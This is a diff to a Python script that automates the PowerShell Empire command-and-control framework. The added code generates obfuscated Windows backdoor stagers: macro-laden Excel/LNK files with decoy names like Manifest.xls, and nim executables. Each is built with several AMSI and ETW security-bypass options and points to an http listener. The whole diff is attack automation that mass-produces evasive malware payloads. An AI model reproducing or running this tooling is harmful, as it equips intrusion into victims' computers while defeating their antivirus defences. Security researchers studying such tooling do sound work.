@@ -173,6 +173,80 @@ def main():
 		Empire.sendline('execute')
 		time.sleep(4)
 
+# Stager as BackDoorLnkMacro
+		Empire.sendline('usestager windows/backdoorLnkMacro')
+		Empire.sendline('set Listener http')
+
+		Empire.sendline('set Bypasses mattifestation')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Manifest.xls')
+		Empire.sendline('set OutFile ManifestlnkMac')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses Liberman')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Liberman.xls')
+		Empire.sendline('set OutFile /root/Empire_powershell/LibermanlnkMac')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses etw')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/etw.xls')
+		Empire.sendline('set OutFile /root/Empire_powershell/etwlnkMac')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses RastaMouse')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Rasta.xls')
+		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouselnkMac')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses ironpython_amsi')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Amsi.xls')
+		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsilnkMac')
+		Empire.sendline('execute')
+		time.sleep(4)
+		
+
+# Stager as Windows_nim
+		Empire.sendline('usestager windows/nim')
+		Empire.sendline('set Listener http')
+
+		Empire.sendline('set Bypasses mattifestation')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Manifest_nim.exe')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses Liberman')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Liberman_nim.exe')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses etw')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/etw_nim.exe')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses RastaMouse')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Rasta_nim.exe')
+		Empire.sendline('execute')
+		time.sleep(4)
+
+		Empire.sendline('set Bypasses ironpython_amsi')
+		Empire.sendline('set Obfuscate True')
+		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Amsi_nim.exe')
+		Empire.sendline('execute')
+		time.sleep(4)
+		
 #END
 
 		Empire.interact()
